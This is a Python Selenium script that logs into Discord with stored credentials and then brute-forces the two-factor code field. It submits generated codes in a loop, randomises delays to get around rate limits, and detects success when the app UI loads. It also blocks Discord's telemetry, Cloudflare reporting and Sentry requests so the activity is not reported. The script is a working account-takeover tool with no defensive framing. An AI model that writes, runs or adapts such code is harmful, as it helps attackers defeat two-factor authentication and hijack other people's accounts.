import os
import time
from dotenv import load_dotenv
import secrets
from lib.codegen import genNormal
from lib.textcolor import toColor

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By

load_dotenv()
driver = webdriver.Chrome(ChromeDriverManager().install())

email = os.getenv('EMAIL')
password = os.getenv('PASSWORD')

def main():
	#Blocking cloudflare and discord science URLS so they don't phone home
	driver.execute_cdp_cmd('Network.setBlockedURLs', {
		"urls": [
			"a.nel.cloudflare.com/report", 
			"https://discord.com/api/v9/science",
			"sentry.io"
		]
	})
	driver.execute_cdp_cmd('Network.enable', {})
	driver.get("https://www.discord.com/login")
	options = webdriver.ChromeOptions() 
	options.add_experimental_option("excludeSwitches", ["enable-logging"])
	time.sleep(1)

	loginEmail = driver.find_element(by=By.NAME, value="email")
	loginPassword = driver.find_element(by=By.NAME, value="password")
	loginEmail.send_keys(email)
	loginPassword.send_keys(password)
	loginPassword.send_keys(Keys.RETURN)
	totpCount = 0
	ratelimitCount = 0

	#loginTOTP = otp input field
	while (True):
		try:
			loginTOTP = driver.find_element(by=By.XPATH, value="//*[@aria-label='Enter Discord Auth/Backup Code']")
			time.sleep(0.5)
			start = time.time()
			sleepy = 0
			#Logic to continuously enter OTP codes
			while (True):
				totp = genNormal(1)
				loginTOTP.send_keys(totp)
				loginTOTP.send_keys(Keys.RETURN)
				totpCount += 1

				#Test for ratelimit
				if ("The resource is being rate limited." in driver.page_source):
					print(toColor("Ratelimited.", "yellow"))
					sleepy = secrets.choice(range(7, 12))
					ratelimitCount += 1
				elif ("Invalid two-factor auth ticket" in driver.page_source):
					elapsed = time.time() - start
					print(toColor("Invalid session ticket.", "red"))
					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
					driver.close()
				else:
					sleepy = secrets.choice(range(6, 10))

				#Testing if the main app UI renders.
				try:
					time.sleep(1)
					loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
					print(toColor(f"Code {totp} worked!"))
					break
				except NoSuchElementException:
					time.sleep(sleepy)
					for i in range(6):
						loginTOTP.send_keys(Keys.BACKSPACE)

					print("Code " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))

		except (NoSuchElementException):
			pass

if __name__ == "__main__":
	main()